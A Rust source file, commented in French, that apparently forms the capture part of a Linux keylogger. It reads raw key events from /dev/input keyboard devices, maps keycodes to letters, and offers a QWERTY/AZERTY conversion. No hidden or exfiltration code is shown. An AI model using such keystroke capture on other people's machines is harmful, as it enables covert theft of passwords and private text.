use std::path::Path;
use std::{
    collections::HashMap,
    fs::File,
    io::{BufRead, BufReader},
};
extern crate uinput;
use byteorder::{NativeEndian, ReadBytesExt};
use std::fs::OpenOptions;
use std::io::{self};
use std::io::{Cursor, Read};
use udev::Enumerator;

pub fn init_keylogger(is_qwerty: &mut bool) -> HashMap<u16, String> {
    // Charger la carte de correspondance de touches
    let file_path = "/usr/include/linux/input-event-codes.h";
    let mut keycode_map: HashMap<u16, String> = create_keycode_map_from_file(file_path);

    *is_qwerty = input_qwerty_azerty(&mut keycode_map);

    keycode_map
}

fn create_keycode_map_from_file(file_path: &str) -> HashMap<u16, String> {
    let mut keycode_map = HashMap::new(); // Utilisation d'un HashMap mutable

    let path = Path::new(file_path);
    let file = File::open(path).expect("Impossible d'ouvrir le fichier");

    let reader = BufReader::new(file);

    // Lire chaque ligne du fichier
    for line in reader.lines() {
        let line = line.expect("Erreur lors de la lecture de la ligne");

        // Si la ligne contient une définition de touche (par exemple KEY_A, KEY_B, etc.)
        if line.contains("KEY_") {
            // Extraire le nom de la touche après "KEY_"
            if let Some(pos) = line.find("KEY_") {
                // Extraction du nom de la touche après "KEY_"
                let key_name = &line[pos + 4..].split_whitespace().next().unwrap_or("");

                // Trouver la dernière partie de la ligne après les espaces pour obtenir le keycode
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() > 1 {
                    let keycode_str = parts[parts.len() - 1];

                    // Essayer de convertir le keycode en nombre
                    if let Ok(keycode) = keycode_str.parse::<u16>() {
                        // Affichage du nom de la touche et de son keycode
                        // println!("Touche : {}, Keycode : {}", key_name, keycode);
                        // Insérer dans le HashMap avec keycode comme clé et key_name comme valeur
                        keycode_map.insert(keycode, key_name.to_string()); // Convertir key_name en String
                    }
                }
            }
        }
    }

    keycode_map
}

fn input_qwerty_azerty(keycode_map: &mut HashMap<u16, String>) -> bool {
    println!("Votre clavier est-il en (Q)WERTY ou (A)ZERTY ? ");
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    // Nettoyer l'entrée et vérifier
    let input = input.trim().to_uppercase();
    // Si l'utilisateur choisit AZERTY, on convertit la carte
    if input == "A" {
        println!("Conversion du clavier en AZERTY...");
        convert_qwerty_to_azerty(keycode_map); // Conversion vers AZERTY
        return false;
    } else if input != "Q" {
        println!("Réponse non valide, supposons que c'est QWERTY par défaut.");
        return input_qwerty_azerty(keycode_map);
    }
    return true;
}

fn convert_qwerty_to_azerty(keycode_map: &mut HashMap<u16, String>) {
    // Mappage QWERTY -> AZERTY
    let qwerty_to_azerty: HashMap<&str, &str> = [
        ("Q", "A"),
        ("W", "Z"),
        ("A", "Q"),
        ("S", "S"),
        ("D", "D"),
        ("F", "F"),
        ("G", "G"),
        ("H", "H"),
        ("J", "J"),
        ("K", "K"),
        ("L", "L"),
        ("SEMICOLON", "M"),
        ("N", "N"),
        ("O", "O"),
        ("P", "P"),
        ("R", "R"),
        ("T", "T"),
        ("Y", "Y"),
        ("U", "U"),
        ("I", "I"),
        ("O", "O"),
        ("P", "P"),
        ("Z", "W"),
    ]
    .iter()
    .cloned()
    .collect();

    // Parcourir le HashMap QWERTY et échanger les touches selon la conversion
    for (_keycode, letter) in keycode_map.iter_mut() {
        if let Some(azerty_letter) = qwerty_to_azerty.get(letter.as_str()) {
            *letter = azerty_letter.to_string(); // Modifie la valeur en place
        }
    }
}

pub fn list_keyboards() -> Vec<String> {
    let mut enumerator = Enumerator::new().unwrap();
    enumerator.match_subsystem("input").unwrap();

    let mut devices: Vec<String> = enumerator
        .scan_devices()
        .unwrap()
        .filter_map(|device| {
            // Vérification si le périphérique est un clavier en comparant avec une chaîne "1"
            if let Some(properties) = device.property_value("ID_INPUT_KEYBOARD") {
                if properties == "1" {
                    // Comparaison avec &str
                    device.devnode().map(|p| p.to_string_lossy().into_owned()) // Conversion en String
                } else {
                    None
                }
            } else {
                None
            }
        })
        .collect();

    // Suppression du clavier virtuel (dernier élément)
    devices.pop();

    devices
}

pub fn get_pressed_key(path: &Path, keycode_map: &HashMap<u16, String>) -> Option<String> {
    let mut file_options = OpenOptions::new();
    file_options.read(true).write(false).create(false);

    let mut event_file = match file_options.open(path) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("Erreur lors de l'ouverture du fichier {:?} : {}", path, err);
            return None;
        }
    };

    let mut packet = [0u8; 24];
    loop {
        if let Err(err) = event_file.read_exact(&mut packet) {
            eprintln!(
                "Erreur lors de la lecture des données dans {:?} : {}",
                path, err
            );
            return None; // Continue to the next iteration for this path
        }

        let mut rdr = Cursor::new(packet);
        let _tv_sec = match rdr.read_u64::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture _tv_sec dans {:?} : {}", path, err);
                continue;
            }
        };
        let _tv_usec = match rdr.read_u64::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture _tv_usec dans {:?} : {}", path, err);
                continue;
            }
        };
        let evtype = match rdr.read_u16::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture evtype dans {:?} : {}", path, err);
                continue;
            }
        };
        let code = match rdr.read_u16::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture code dans {:?} : {}", path, err);
                continue;
            }
        };
        let value = match rdr.read_i32::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture value dans {:?} : {}", path, err);
                continue;
            }
        };

        if evtype == 1 && value == 1 {
            // Vérifie si c'est un événement de type touche (EV_KEY)
            if let Some(letter) = keycode_map.get(&code) {
                return Some(letter.clone());
            } else {
                eprintln!(
                    "Chemin {:?} : Aucune lettre trouvée pour le keycode {}",
                    path, code
                );
            }
        }
    }
}
